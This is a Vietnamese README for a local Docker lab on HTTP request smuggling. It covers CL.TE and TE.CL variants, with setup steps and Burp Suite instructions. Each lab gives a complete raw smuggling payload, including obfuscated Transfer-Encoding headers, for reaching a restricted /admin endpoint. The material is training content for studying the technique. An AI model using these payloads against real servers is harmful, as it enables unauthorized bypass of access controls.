## Yêu cầu hệ thống

- Docker và Docker Compose
- Burp Suite (Community hoặc Professional)
- Trình duyệt web

## Cài đặt

1. Clone hoặc giải nén lab vào thư mục
2. Chạy lệnh:
   ```bash
   docker-compose up -d
   ```
3. Truy cập http://IPVM:8081
4. Truy cập http://IPVM:8082

## Các Lab

### Lab 1: CL.TE
- **Endpoint:** http://IPVM:8081
- **Mục tiêu:** Truy cập /admin bị restrict
- **Frontend:** Xử lý Content-Length
- **Backend:** Xử lý Transfer-Encoding
- **Payload**
```
GET /hello HTTP/1.1
Host: 0.0.0.0:8001
Content-Length: 44
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: 0.0.0.0:8001

```
- Ở Repeater: Vào **Hex** --> chuyển space (20) ở sau dấu (:) **Transfer-Encoding** thành **0b** --> Send **2 lần**

### Lab 2: TE.CL 
- **Endpoint:** http://IPVM:8082
- **Mục tiêu:** Truy cập /admin bị restrict
- **Backend:** Xử lý Content-Length
- **Frontend:** Xử lý Transfer-Encoding
- **Payload**
```
GET /hello HTTP/1.1
Host: 0.0.0.0:8002
Content-Length: 4
Transfer-Encoding: asdchunked

2b
GET /admin HTTP/1.1
Host: 0.0.0.0:8002


0

GET /hello HTTP/1.1
Host: 0.0.0.0:8002


```
  
## Sử dụng với Burp Suite

1. Cấu hình browser sử dụng Burp proxy (127.0.0.1:8080)
2. Tắt Update Content-Length trong Burp
3. Gửi request và modify headers/body theo payload
4. Quan sát response

## Dừng Lab

```bash
docker-compose down
```

## Xóa toàn bộ

```bash
docker-compose down -v
```
